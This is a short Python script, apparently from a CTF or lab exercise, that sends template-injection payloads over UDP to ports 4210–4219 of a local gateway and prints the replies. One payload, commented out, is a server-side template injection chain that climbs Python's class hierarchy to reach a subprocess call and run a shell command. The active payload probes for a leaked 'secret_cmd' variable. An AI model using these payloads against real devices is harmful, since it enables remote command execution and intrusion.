import socket

GATEWAY = "192.168.4.1"
#PAYLOAD = b"""{{''.__class__.mro()[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0].strip()}}"""
PAYLOAD = b"{{secret_cmd}}"
#PAYLOAD = b"{{}}"

TIMEOUT = 1

for port in range(4210, 4220):
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
        s.settimeout(TIMEOUT)
        try:
            s.sendto(PAYLOAD, (GATEWAY, port))
            data, addr = s.recvfrom(1024)
            print(f"{port}: {data.decode(errors='replace')}  (from {addr[1]})")
        except Exception as e:
            print(f"nothing on port {port}, {e}")
